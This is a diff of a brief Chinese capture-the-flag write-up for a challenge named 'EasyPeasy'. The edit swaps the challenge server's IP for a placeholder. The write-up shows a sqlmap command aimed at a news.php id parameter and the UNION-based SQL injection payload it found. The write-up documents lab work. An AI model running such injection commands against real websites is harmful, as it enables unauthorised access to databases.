@@ -1,10 +1,10 @@
 ### EasyPeasy
 
-題目給 http://140.110.112.32:4001
+一連上去先用自動帶我們到 http://xxx/news.php?id=1
 
-一連上去先用自動帶我們到 http://140.110.112.32:4001/news.php?id=1
+先 `sqlmap -u http://xxx/news.php?i --random-agent` 
 
-先 `sqlmap -u http://140.110.112.32:4001/news.php?i --random-agent` 
+(以上xxx為題目URL)
 
 找到playload `id=-4031 UNION ALL SELECT NULL,NULL,CONCAT(0x7171706a71,0x6872464461534467546173754f6d554f5a454178556d6f6f546578736a4
 f4274506a4c596a76774e,0x717a707671)-- hZDH`
